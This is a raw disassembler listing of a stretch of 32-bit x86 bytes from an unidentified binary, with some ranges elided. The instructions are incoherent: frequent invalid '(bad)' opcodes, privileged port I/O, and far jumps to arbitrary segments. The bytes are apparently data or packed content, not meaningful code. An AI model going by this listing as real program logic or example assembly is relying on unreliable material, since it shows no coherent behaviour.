  428098:	fistp  DWORD PTR [ebp+0x2d]
  42809b:	mul    BYTE PTR [edx+0x80fc193]
  4280a1:	jl     0x42810e
  4280a3:	cdq    
  4280a4:	pop    edx
  4280a5:	add    al,0x59
  4280a7:	in     al,0x5a
  4280a9:	stos   BYTE PTR es:[edi],al
  4280aa:	ror    BYTE PTR [esi+0x51c8abb9],cl
  4280b0:	jnp    0x428078
  4280b2:	sbb    DWORD PTR [eax],ebx
  4280b4:	popf   
  4280b5:	dec    edx
  4280b6:	popf   
  4280b7:	jmp    0x42811a
  4280b9:	loopne 0x428126
  4280bb:	sub    DWORD PTR ds:0x81cec4d2,edi
  4280c1:	fcomp  QWORD PTR [eax+0x3ce83bf2]
  4280c7:	adc    eax,0x7cade012
  4280cc:	adc    al,0x21
  4280ce:	call   0x5887:0x88175c9a
  4280d5:	pop    ebp
  4280d6:	push   ebp
  4280d7:	test   BYTE PTR [eax-0x73],ch
  4280da:	sub    al,0xb9
  4280dc:	(bad)  
  4280dd:	popf   
  4280de:	mov    ds:0xc437ac55,eax
  4280e3:	inc    eax
  4280e4:	adc    al,0x30
  4280e6:	hlt    
  4280e7:	loopne 0x428165
  4280e9:	push   edi
  4280ea:	nop
  4280eb:	mov    al,0x4b
  4280ed:	jp     0x42813d
  4280ef:	je     0x4280e7
  4280f1:	(bad)  
  4280f4:	pop    es
  4280f5:	test   edi,ebx
  4280f7:	sub    al,0x36
  4280f9:	pop    ss
  4280fa:	cmp    DWORD PTR [eax-0x27],esi
  4280fd:	rol    DWORD PTR [eax+esi*4],0x5d
  428101:	jno    0x42814f
  428103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428104:	hlt    
  428105:	arpl   si,dx
  428107:	sbb    edx,DWORD PTR [edx+0x42]
  42810a:	retf   
  42810b:	data16 mov ah,0x60
  42810e:	(bad)  
  42810f:	cli    
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	inc    esp
  428181:	dec    esp
  428182:	lahf   
  428183:	pop    ebp
  428184:	cmp    BYTE PTR [ecx+eax*1+0x10400],ch
  42818b:	add    bl,ah
  42818d:	scas   al,BYTE PTR es:[edi]
  42818e:	inc    edx
  42818f:	dec    ecx
  428190:	stc    
  428191:	sub    al,0x5f
  428193:	stc    
  428194:	mov    cl,BYTE PTR [ecx-0x6d]
  428197:	xchg   ebp,eax
  428198:	and    DWORD PTR [ebx*8-0x5107dc47],0xffffffe0
  4281a0:	daa    
  4281a1:	bound  eax,QWORD PTR [ebx]
  4281a3:	push   eax
  4281a4:	cli    
  4281a5:	mov    edi,DWORD PTR [ebx-0x44902adb]
  4281ab:	out    dx,al
  4281ac:	inc    esp
  4281ad:	ret    
  4281ae:	xor    BYTE PTR [edi],cl
  4281b0:	repnz fisubr WORD PTR [edi]
  4281b3:	(bad)  
  4281b4:	bound  esp,QWORD PTR [edi+ecx*8]
  4281b7:	cmp    DWORD PTR [ecx+0x257d5791],0x51ebbdde
  4281c1:	ja     0x4281a7
  4281c3:	inc    esi
  4281c4:	jns    0x428217
  4281c6:	(bad)  
  4281c7:	out    dx,al
  4281c8:	popa   
  4281c9:	popf   
  4281ca:	mov    dl,0x11
  4281cc:	fs ds xor ah,BYTE PTR ss:[edx+0x2db3f015]
  4281d5:	in     eax,dx
  4281d6:	mov    WORD PTR [edx+0x7fdaa435],es
  4281dc:	int    0xc7
  4281de:	inc    ebx
  4281df:	dec    esp
  4281e0:	imul   esi,DWORD PTR [edx-0x8],0xffffffac
  4281e4:	cmp    dh,bl
  4281e6:	js     0x428185
  4281e8:	mov    dl,0xd2
  4281ea:	inc    ecx
  4281eb:	(bad)  
  4281ed:	je     0x4281e6
  4281ef:	fld    QWORD PTR [edx+eiz*8-0x28]
  4281f3:	mov    esp,0x71938717
  4281f8:	add    al,0xa4
  4281fa:	push   esp
  4281fb:	sub    al,0xc4
  4281fd:	jl     0x42821a
  4281ff:	jl     0x4281cd
  428201:	mov    bh,0xfe
  428203:	jmp    0x2aa5:0x4ec02a78
  42820a:	retf   0x6250
  42820d:	and    DWORD PTR [eax],ebx
  42820f:	fist   WORD PTR ds:0xb103f511
  428215:	inc    ecx
  428216:	imul   esi,DWORD PTR [edi+0x27],0xb535a7cc
  42821d:	push   ebx
  42821e:	xchg   ecx,eax
  42821f:	push   ss
  428220:	inc    edx
  428221:	(bad)  
  428222:	lock shr DWORD PTR [ecx+ebx*2+0x1d],cl
  428227:	jecxz  0x42822a
  428229:	test   BYTE PTR [esi],dl
  42822b:	dec    edi
  42822c:	stos   DWORD PTR es:[edi],eax
  42822d:	stos   BYTE PTR es:[edi],al
  42822e:	nop
  42822f:	js     0x428296
  428231:	rol    BYTE PTR [esi-0x5e],cl
  428234:	xchg   ebp,eax
  428235:	psrad  mm2,QWORD PTR [ecx]
  428238:	push   esi
  428239:	mov    cl,0x30
  42823b:	retf   0x7366
  42823e:	sbb    ebp,DWORD PTR [eax+0x78cdc81d]
  428244:	ins    BYTE PTR es:[edi],dx
  428245:	lds    ecx,FWORD PTR es:[eax]
  428248:	mov    eax,0x2935fbbe
  42824d:	push   edi
  42824e:	mov    WORD PTR [esp+ebx*1+0x2f5e8edb],es
  428255:	add    al,0x80
  428257:	mov    ecx,0xafe2b7f6
  42825c:	adc    ebp,ebp
  42825e:	nop
  42825f:	lea    eax,[ecx-0xd8f6094]
  428265:	sbb    dl,BYTE PTR [ecx+ecx*1]
  428268:	fild   QWORD PTR [edx+eiz*1]
  42826b:	stc    
  42826c:	test   eax,0x825ad6c0
  428271:	div    BYTE PTR [ecx-0xd]
  428274:	lea    eax,[ecx+0x714e111e]
  42827a:	jb     0x428224
  42827c:	cmp    eax,0xab1bb122
  428281:	adc    DWORD PTR [edi],edx
  428283:	push   esi
  428284:	enter  0x19fb,0xcf
  428288:	push   0xf98a9825
  42828d:	mov    eax,0x322
	...
  4282f2:	add    BYTE PTR [eax],al
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	sbb    esp,DWORD PTR [edx-0x52c35bc5]
  428306:	add    DWORD PTR [eax],eax
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	(bad)  
  42830d:	clc    
  42830e:	into   
  42830f:	mov    ch,0xb7
  428311:	or     BYTE PTR [eax],bh
  428313:	jno    0x4282f3
  428315:	dec    ecx
  428316:	nop
  428317:	scas   eax,DWORD PTR es:[edi]
  428318:	ficom  DWORD PTR [eax]
  42831a:	push   esp
  42831b:	inc    ebx
  42831c:	sub    al,0x55
  42831e:	inc    ebx
  42831f:	pop    eax
  428320:	jnp    0x428372
  428322:	jmp    0x4282b3
  428324:	pop    edx
  428325:	mov    edi,0xd746857f
  42832a:	fimul  WORD PTR [edx+0x61fc25bd]
  428330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428331:	cmp    dh,BYTE PTR ds:0x4857c2f9
  428337:	mov    edi,DWORD PTR [eax-0x77]
  42833a:	mov    dh,0xd4
  42833c:	lods   eax,DWORD PTR ds:[esi]
  42833d:	jbe    0x428344
  42833f:	mov    ds:0xc116e224,eax
  428344:	sub    eax,0xb7c72795
  428349:	inc    ecx
  42834a:	inc    esp
  42834b:	sbb    DWORD PTR [ebx-0x57f7fb93],0xffffffa1
  428352:	adc    eax,0x7992c88e
  428357:	pop    esi
  428358:	xchg   esp,eax
  428359:	sub    DWORD PTR ds:0x28619f55,edi
  42835f:	or     esp,edi
  428361:	adc    cl,BYTE PTR [ebp+0x69767d7a]
  428367:	(bad)  
  428369:	pop    ecx
  42836a:	mov    dl,0x7d
  42836c:	adc    eax,0xeadcf571
  428371:	ss leave 
  428373:	jge    0x4283ea
  428375:	retf   0x928f
  428378:	xor    dh,bl
  42837a:	mov    esp,0x69da4c24
  42837f:	inc    ebx
  428380:	lods   al,BYTE PTR ds:[esi]
  428381:	cli    
  428382:	mov    ebp,DWORD PTR [eax+0x5a]
  428385:	cmp    BYTE PTR ds:0xe43def1b,ch
  42838b:	aas    
  42838c:	cmp    ch,BYTE PTR [edi]
  42838e:	or     al,0x1
  428390:	push   ss
  428391:	test   eax,0x293061e0
  428396:	inc    ecx
  428397:	inc    ecx
  428398:	je     0x4283d5
  42839a:	mov    DWORD PTR [ecx+edi*8-0x29],esi
  42839e:	out    0xfe,al
  4283a0:	retf   
  4283a1:	push   es
  4283a2:	in     eax,dx
  4283a3:	js     0x42832c
  4283a5:	pop    eax
  4283a6:	pop    es
  4283a7:	fld    TBYTE PTR [esi-0x1002b890]
  4283ad:	adc    BYTE PTR [esi+0x5fdf2126],0xd3
  4283b4:	or     al,0x4f
  4283b6:	jle    0x428437
  4283b8:	dec    esp
  4283b9:	or     al,0xaa
  4283bb:	inc    ecx
  4283bc:	mov    al,ds:0x7290162
  4283c1:	ja     0x4283e3
  4283c3:	add    eax,0x18c299b9
  4283c8:	dec    eax
  4283c9:	push   eax
  4283ca:	shr    BYTE PTR [edx+ebx*8],cl
  4283cd:	lods   al,BYTE PTR ds:[esi]
  4283ce:	cmp    DWORD PTR ss:[ecx],0x4710a462
  4283d5:	mov    dh,0xda
  4283d7:	xchg   esp,eax
  4283d8:	xchg   edi,eax
  4283d9:	loop   0x4283d5
  4283db:	xchg   BYTE PTR [edi-0x23],dl
  4283de:	mov    edx,0xd1f3a6a6
  4283e3:	add    BYTE PTR [ecx],al
  4283e5:	imul   esi,DWORD PTR [eax-0x318f069],0x2f2bcf6c
  4283ef:	mov    esi,0xdbede9fe
  4283f4:	fmul   QWORD PTR [ebx]
  4283f6:	mov    ds:0x66261fca,eax
  4283fb:	push   edi
  4283fc:	or     al,0xb6
  4283fe:	out    0x5e,al
  428400:	or     al,0x1e
  428402:	(bad)  
  428403:	into   
  428404:	fisttp WORD PTR [ecx+edx*2-0x5a]
  428408:	push   ds
  428409:	js     0x428413
  42840b:	sbb    al,0xeb
  42840d:	(bad)  
  42840e:	in     eax,0x27
	...
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x71abfb32
  428481:	adc    DWORD PTR [ebx],eax
  428483:	test   BYTE PTR [eax-0x52],al
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	mov    DWORD PTR [edx],edx
  42848e:	sahf   
  42848f:	pop    es
  428490:	aaa    
  428491:	and    esi,DWORD PTR [ebx+ebp*8-0x40dccb77]
  428498:	mov    dl,0xed
  42849a:	addr16 pop es
  42849c:	sar    DWORD PTR [eax+edi*2],1
  42849f:	ret    0x570c
  4284a2:	mov    ds,WORD PTR [ebx+eiz*8+0x10]
  4284a6:	cmc    
  4284a7:	fdivr  DWORD PTR [ebp-0x1e]
  4284aa:	or     al,0xf2
  4284ac:	xor    edi,eax
  4284ae:	push   es
  4284af:	bound  esi,QWORD PTR [ecx-0x74]
  4284b2:	dec    ebp
  4284b3:	js     0x4284ae
  4284b5:	inc    esi
  4284b6:	aas    
  4284b7:	pop    ebp
  4284b8:	dec    esp
  4284b9:	sub    eax,0x1474ed7f
  4284be:	popa   
  4284bf:	sub    bl,BYTE PTR [esi+0x1bb74f16]
  4284c5:	jns    0x42844b
  4284c7:	fistp  WORD PTR [edx+0x187927d5]
  4284cd:	jmp    0x4410:0x5c7a2555
  4284d4:	stos   BYTE PTR es:[edi],al
  4284d5:	test   cl,0x55
  4284d8:	shr    DWORD PTR [esi+ebp*8+0x66af57a0],cl
  4284df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284e0:	mov    ch,0x9a
  4284e2:	pop    ds
  4284e3:	cmp    cl,dl
  4284e5:	xor    esp,DWORD PTR [edx-0x26]
  4284e8:	inc    esi
  4284e9:	bnd jmp 0xe0c5a300
  4284ef:	xchg   edx,eax
  4284f0:	xchg   esi,eax
  4284f1:	mov    ecx,0xe5428316
  4284f6:	cmp    esi,DWORD PTR [ebx+0x12]
  4284f9:	fmul   DWORD PTR [edi+eax*1]
  4284fc:	xchg   ecx,eax
  4284fd:	mov    esp,0x7ac9191e
  428502:	or     esi,DWORD PTR [eax-0x3f]
  428505:	or     eax,0x8095dd83
  42850a:	add    eax,0xcb403b11
  42850f:	sub    al,0x46
  428511:	cld    
  428512:	xlat   BYTE PTR ds:[ebx]
  428513:	mov    ds:0x2d6cdf5e,eax
  428518:	in     al,0xa9
  42851a:	call   DWORD PTR [ebx-0x62681e6e]
  428520:	jmp    0x4284f2
  428522:	inc    ebp
  428523:	dec    ecx
  428524:	(bad)  
  428525:	mov    dl,cl
  428527:	test   ch,dh
  428529:	ds into 
  42852b:	sbb    eax,0xf783eccd
  428530:	and    BYTE PTR ds:0xbb5163a,ch
  428536:	sbb    ecx,DWORD PTR [esi-0x7d]
  428539:	inc    edx
  42853a:	fcmovnu st,st(0)
  42853c:	jmp    0x428532
  42853e:	outs   dx,DWORD PTR ds:[esi]
  42853f:	inc    edx
  428540:	dec    ecx
  428541:	ret    
  428542:	or     al,BYTE PTR [edx+0x5a]
  428545:	jbe    0x4284ee
  428547:	cmp    ebx,DWORD PTR [esi-0x670db280]
  42854d:	or     bh,BYTE PTR [edx-0x2f0ccd76]
  428553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428554:	pop    ecx
  428555:	xor    eax,0x623f0010
  42855a:	push   eax
  42855b:	cmp    BYTE PTR [esi-0xa],0x65
  42855f:	aas    
  428560:	pop    eax
  428561:	gs das 
  428563:	std    
  428564:	mov    al,ds:0xdca6134e
  428569:	sbb    edi,DWORD PTR [ebx-0x49]
  42856c:	pop    edx
  42856d:	sbb    esi,esi
  42856f:	stos   DWORD PTR es:[edi],eax
  428570:	push   cs
  428571:	inc    esi
  428572:	ins    DWORD PTR es:[edi],dx
  428573:	daa    
  428574:	dec    edx
  428575:	arpl   WORD PTR [edi+eiz*4-0x75],bx
  428579:	sub    dh,BYTE PTR [ebx]
  42857b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42857c:	jno    0x4285b4
  42857e:	mov    esi,0x9f310cca
  428583:	ror    BYTE PTR [eax+edi*1+0x5abece99],1
  42858a:	inc    esi
  42858b:	cs int 0x82
  42858e:	loop   0x428552
	...
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x6093a3f6
  428602:	xchg   BYTE PTR [edx+0x1af44],dh
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	and    DWORD PTR [ebp+0x43],esi
  42860f:	inc    edi
  428610:	sbb    ch,ah
  428612:	cmp    DWORD PTR [ecx-0x5a80655],0xffffffda
  428619:	pop    ds
  42861a:	stc    
  42861b:	mov    edx,0x396c7c2f
  428620:	push   cs
  428621:	icebp  
  428622:	sub    BYTE PTR [eax+0x45],bh
  428625:	mov    al,0xed
  428627:	out    dx,eax
  428628:	stos   BYTE PTR es:[edi],al
  428629:	push   ebx
  42862a:	ss inc ebp
  42862c:	lea    ecx,[ebx*8+0x790f0228]
  428633:	jecxz  0x4285c1
  428635:	xor    eax,0xc89fb599
  42863a:	(bad)  
  42863b:	sub    eax,0x955933f2
  428640:	jnp    0x42867c
  428642:	fcomp  QWORD PTR [eax+0x1c052205]
  428648:	dec    ebp
  428649:	lahf   
  42864a:	push   0xffffffba
  42864c:	sub    BYTE PTR [eax],ch
  42864e:	cmp    eax,0x4c5e4cfe
  428653:	and    BYTE PTR [eax-0x10],ch
  428656:	shl    DWORD PTR [ebx-0x26e2526b],1
  42865c:	jmp    0x4285e2
  42865e:	mov    ah,0x47
  428660:	jnp    0x428639
  428662:	cli    
  428663:	push   ss
  428664:	and    esi,eax
  428666:	mov    ebp,0xcb8cdd2a
  42866b:	aam    0xd3
  42866d:	pop    ss
  42866e:	stos   BYTE PTR es:[edi],al
  42866f:	jl     0x428691
  428671:	xor    ch,dl
  428673:	mov    cl,0x60
  428675:	call   0x8924124f
  42867a:	or     ah,dh
  42867c:	mov    edi,0x235b7208
  428681:	div    BYTE PTR [eax-0x54]
  428684:	add    BYTE PTR [ecx],dl
  428686:	and    BYTE PTR [ebx],dh
  428688:	sbb    DWORD PTR [ebp+ecx*4-0x10],eax
  42868c:	and    DWORD PTR [edi+ecx*4],0xfffffff7
  428690:	leave  
  428691:	fdivr  DWORD PTR [edx]
  428693:	mov    ebx,0x3281da7c
  428698:	aas    
  428699:	xor    al,0x4c
  42869b:	or     bl,dl
  42869d:	(bad)  
  42869e:	jns    0x428692
  4286a0:	iret   
  4286a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286a2:	sub    BYTE PTR [ebx],ah
  4286a4:	pushf  
  4286a5:	pop    ds
  4286a6:	lds    edx,FWORD PTR [edi]
  4286a8:	mov    dl,0x91
  4286aa:	or     bl,bl
  4286ac:	cmp    DWORD PTR [edx+0x21],0xc07be5f7
  4286b3:	cli    
  4286b4:	sub    eax,0x9a9dfc9e
  4286b9:	pop    ss
  4286ba:	loope  0x428700
  4286bc:	adc    BYTE PTR [ebx+0x61f44035],al
  4286c2:	add    DWORD PTR [ebx-0x66775240],0x2ca3a930
  4286cc:	mov    edi,0x5968c95d
  4286d1:	test   al,0x26
  4286d3:	mov    eax,0x7b9a4c87
  4286d8:	sbb    eax,0x3b1a424
  4286dd:	test   BYTE PTR [esi-0x2],bl
  4286e0:	ret    
  4286e1:	add    DWORD PTR [eax+0x40],edx
  4286e4:	retf   
  4286e5:	arpl   WORD PTR [ebp-0x54dd222b],bx
  4286eb:	into   
  4286ec:	and    al,0x85
  4286ee:	jo     0x4286f7
  4286f0:	pop    ebx
  4286f1:	sbb    BYTE PTR [edx+0x48a06b8c],ah
  4286f7:	push   edi
  4286f8:	imul   edx,DWORD PTR [ebp-0x38],0xffffff94
  4286fc:	mov    ebp,0xfd550357
  428701:	mul    DWORD PTR [edx+eax*2-0x3b]
  428705:	mov    edx,0x588b17c5
  42870a:	inc    ecx
  42870b:	pop    edx
  42870c:	inc    edx
  42870d:	lods   al,BYTE PTR ds:[esi]
  42870e:	les    edi,FWORD PTR [ecx]
	...
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x427c396
  428783:	dec    BYTE PTR [eax-0x50]
  428786:	add    DWORD PTR [eax],eax
  428788:	add    al,0x1
  42878a:	add    BYTE PTR [eax],al
  42878c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42878d:	mov    al,ds:0x31773369
  428793:	and    esp,DWORD PTR [eax-0x1ddfe25]
  428799:	repz jo 0x428726
  42879c:	sahf   
  42879d:	xchg   ebp,eax
  42879e:	fnstcw WORD PTR [edi-0xa]
  4287a1:	retf   
  4287a2:	mov    cl,0x9d
  4287a4:	push   0x625cf3ce
  4287a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287aa:	test   DWORD PTR [esi+0x332d8a44],ebx
  4287b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4287b1:	das    
  4287b2:	bound  esi,QWORD PTR [edx+0x12]
  4287b5:	pop    ebp
  4287b6:	cmp    ecx,DWORD PTR [esi]
  4287b8:	fisubr DWORD PTR ds:0x4471bda6
  4287be:	lea    esp,[edx]
  4287c0:	or     edx,DWORD PTR [edx-0x179bcc8a]
  4287c6:	push   0x34
  4287c8:	loope  0x428824
  4287ca:	sbb    esp,DWORD PTR [ebx-0x18aeff28]
  4287d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287d1:	add    ecx,ecx
  4287d3:	fadd   DWORD PTR [edx]
  4287d5:	mov    WORD PTR [edx+0x1f],fs
  4287d8:	xchg   ecx,eax
  4287d9:	mov    BYTE PTR [edi-0x5],dl
  4287dc:	adc    BYTE PTR [esi+0x4b18a05],al
  4287e2:	pop    edi
  4287e3:	ret    
  4287e4:	cld    
  4287e5:	not    BYTE PTR [ebp-0x3f61bdd7]
  4287eb:	stos   BYTE PTR es:[edi],al
  4287ec:	repz dec esp
  4287ee:	stc    
  4287ef:	lahf   
  4287f0:	mov    edx,0x118ed794
  4287f5:	pop    ebp
  4287f6:	jns    0x42885a
  4287f8:	xchg   DWORD PTR [edx-0x5e],esi
  4287fb:	(bad)  
  4287fc:	push   0x75
  4287fe:	mov    ah,0xa2
  428800:	mov    ss,ebx
  428802:	stos   BYTE PTR es:[edi],al
  428803:	fcmovnb st,st(0)
  428805:	daa    
  428806:	rcr    DWORD PTR [eax],1
  428808:	inc    ebx
  428809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42880a:	cmp    DWORD PTR [esi-0x78d6f50a],ebx
  428810:	(bad)  
  428811:	repnz mov BYTE PTR [edi+0x4f],bh
  428815:	das    
  428816:	mov    DWORD PTR [eax-0x56],esi
  428819:	fs add dl,0xc1
  42881d:	xlat   BYTE PTR ds:[ebx]
  42881e:	cwde   
  42881f:	fs mov cl,0x25
  428822:	jo     0x428821
  428824:	xchg   esp,eax
  428825:	pop    es
  428826:	aas    
  428827:	push   esi
  428828:	sbb    eax,0x2de7195e
  42882d:	jmp    0x4287f3
  42882f:	pop    esp
  428830:	pop    eax
  428831:	pop    ebx
  428832:	jnp    0x4287bd
  428834:	popf   
  428835:	ins    DWORD PTR es:[edi],dx
  428836:	ins    DWORD PTR es:[edi],dx
  428837:	into   
  428838:	push   ebp
  428839:	fsincos 
  42883b:	out    dx,eax
  42883c:	jecxz  0x4288a6
  42883e:	xchg   eax,edi
  428840:	hlt    
  428841:	cli    
  428842:	aam    0x1c
  428844:	jg     0x428881
  428846:	lahf   
  428847:	ret    
  428848:	(bad)  
  428849:	in     eax,0xb4
  42884b:	cmc    
  42884c:	sub    cl,ch
  42884e:	loope  0x428878
  428850:	mov    WORD PTR [ecx+0x65],gs
  428853:	jnp    0x428862
  428855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428856:	sub    ebp,DWORD PTR [ecx]
  428858:	lds    eax,FWORD PTR [ecx]
  42885a:	cwde   
  42885b:	adc    cl,BYTE PTR [ecx-0x4]
  42885e:	(bad)  
  42885f:	jbe    0x42887a
  428861:	push   ss
  428862:	lds    esp,FWORD PTR [ebx+0x3ab80ba6]
  428868:	bswap  ebp
  42886a:	xor    eax,0x46709c62
  42886f:	and    dl,bl
  428871:	mov    ch,0xd2
  428873:	pop    ss
  428874:	push   edx
  428875:	rol    BYTE PTR [edi-0x4e],1
  428878:	dec    ecx
  428879:	sub    dh,BYTE PTR ds:0x4989f381
  42887f:	mov    esi,0xa68b35fb
  428884:	nop
  428885:	push   eax
  428886:	cli    
  428887:	enter  0xc3,0x18
  42888b:	rol    BYTE PTR [edi],0x60
  42888e:	popf   
  42888f:	sub    eax,0x0
	...
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x62e262f1],bx
  428902:	adc    dl,bh
  428904:	dec    esp
  428905:	mov    cl,0x1
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	(bad)  
  42890d:	enter  0xfe1e,0xd9
  428911:	shl    BYTE PTR [eax-0x2aba3e7e],cl
  428917:	cmp    DWORD PTR [esi],esi
  428919:	(bad)  
  42891a:	lods   al,BYTE PTR ds:[esi]
  42891b:	xor    ch,BYTE PTR [edx+eiz*1]
  42891e:	mov    dh,0x83
  428920:	repnz loop 0x4288d5
  428923:	mov    dh,BYTE PTR [esi+0x58]
  428926:	xlat   BYTE PTR ds:[ebx]
  428927:	mov    bh,0x8d
  428929:	int    0x87
  42892b:	push   ecx
  42892c:	push   0x1baaf21f
  428931:	push   ecx
  428932:	xchg   edi,esi
  428934:	out    dx,al
  428935:	dec    esi
  428936:	xchg   edi,eax
  428937:	mov    ds:0x7ab6ce56,al
  42893c:	pop    ds
  42893d:	(bad)  [ecx]
  42893f:	ror    DWORD PTR [ecx],0xd0
  428942:	push   eax
  428943:	adc    BYTE PTR [ecx],dh
  428945:	jle    0x428926
  428947:	jmp    0x1ffadb35
  42894c:	ja     0x42899f
  42894e:	dec    bh
  428950:	jp     0x4289be
  428952:	test   eax,0x3bc1c7b5
  428957:	ror    DWORD PTR [edi+0x3fe892ab],cl
  42895d:	neg    BYTE PTR [ecx+ecx*1]
  428960:	and    DWORD PTR [esi],0xf8875c50
  428966:	lock push ebx
  428968:	das    
  428969:	xchg   esi,eax
  42896a:	adc    al,0xa5
  42896c:	(bad)  
  42896d:	cmp    BYTE PTR [edi-0x10],bh
  428970:	or     DWORD PTR [ebx],eax
  428972:	pop    edx
  428973:	lock rol BYTE PTR [eax-0x20241dcc],cl
  42897a:	pop    esi
  42897b:	jge    0x4289d8
  42897d:	adc    al,0xb4
  42897f:	inc    esi
  428980:	sbb    BYTE PTR [ecx-0x1a],ah
  428983:	pop    ds
  428984:	sub    DWORD PTR [ebp-0x3c],eax
  428987:	out    dx,al
  428988:	xchg   edx,eax
  428989:	and    eax,0xe17fbe15
  42898e:	ret    
  42898f:	fstp   QWORD PTR [edx+ecx*4-0x7c408ecf]
  428996:	mov    cl,0x59
  428998:	mov    ah,0x2e
  42899a:	push   ss
  42899b:	jmp    0x428a0d
  42899d:	cmp    esi,DWORD PTR [ebx+0x814341f]
  4289a3:	jbe    0x4289ea
  4289a5:	jnp    0x4289cf
  4289a7:	loopne 0x428972
  4289a9:	inc    edi
  4289aa:	fimul  DWORD PTR [eax+0x6f]
  4289ad:	jg     0x4289af
  4289af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289b0:	cli    
  4289b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4289b3:	inc    ebx
  4289b4:	cli    
  4289b5:	out    dx,eax
  4289b6:	retf   
  4289b7:	fist   WORD PTR [ebx]
  4289b9:	daa    
  4289ba:	enter  0x73a2,0xe1
  4289be:	outs   dx,DWORD PTR ds:[esi]
  4289bf:	sub    ebp,edi
  4289c1:	loope  0x428979
  4289c3:	dec    esp
  4289c4:	scas   al,BYTE PTR es:[edi]
  4289c5:	jmp    0x4289f4
  4289c7:	dec    esp
  4289c8:	retf   
  4289c9:	inc    edi
  4289ca:	retf   0xb39d
  4289cd:	ret    0x3a99
  4289d0:	loop   0x428a29
  4289d2:	ins    DWORD PTR es:[edi],dx
  4289d3:	jne    0x42899c
  4289d5:	out    0x60,al
  4289d7:	das    
  4289d8:	pop    es
  4289d9:	(bad)  
  4289db:	add    BYTE PTR ds:0x8c4193c2,ch
  4289e1:	in     al,0xc4
  4289e3:	pop    esp
  4289e4:	jg     0x4289e8
  4289e6:	adc    ebp,DWORD PTR [esi]
  4289e8:	adc    eax,esi
  4289ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4289eb:	lahf   
  4289ec:	adc    bh,BYTE PTR [edx]
  4289ee:	ret    0x6127
  4289f1:	mov    DWORD PTR [ebp+0x33],0x85215821
  4289f8:	jmp    0x4289d3
  4289fa:	mov    edi,0x2b7dafb6
  4289ff:	adc    ch,dl
  428a01:	ret    0x9b75
  428a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a05:	pop    ds
  428a06:	arpl   WORD PTR [eax-0x15],si
  428a09:	mov    cl,BYTE PTR [ebx]
  428a0b:	push   eax
  428a0c:	cdq    
  428a0d:	xor    ebp,DWORD PTR [ecx]
  428a0f:	cmp    al,0x0
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x15d18bed]
  428a83:	mov    ah,0x50
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	sti    
  428a8d:	inc    esi
  428a8e:	jb     0x428a21
  428a90:	or     bl,BYTE PTR [ebx]
  428a92:	sub    BYTE PTR [edi+0x66],0x48
  428a96:	push   0x59
  428a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a99:	push   ecx
  428a9a:	jo     0x428a2d
  428a9c:	shl    DWORD PTR [ecx-0x20ddc382],1
  428aa2:	gs cmp eax,0xe90a3d26
  428aa8:	mov    ch,0x4
  428aaa:	cmp    edx,DWORD PTR [edi-0x6e]
  428aad:	mov    ebp,0x80e64d43
  428ab2:	add    DWORD PTR [esi+0x63],0xc64874f1
  428ab9:	lds    esp,FWORD PTR [eax+0x168d9214]
  428abf:	xchg   ebp,eax
  428ac0:	cmp    BYTE PTR [eax+0x7ba9bf5c],dh
  428ac6:	popf   
  428ac7:	sbb    edx,DWORD PTR [ebx]
  428ac9:	xchg   dl,bh
  428acb:	(bad)  
  428acd:	aaa    
  428ace:	aaa    
  428acf:	sub    BYTE PTR [edx-0x20c215c0],cl
  428ad5:	sub    eax,0xbe400e91
  428ada:	or     eax,0xc325714a
  428adf:	lds    ebx,FWORD PTR [ebp+0x14b0e504]
  428ae5:	or     esp,DWORD PTR [ebx]
  428ae7:	xchg   ecx,eax
  428ae8:	mov    dh,0xa9
  428aea:	inc    ecx
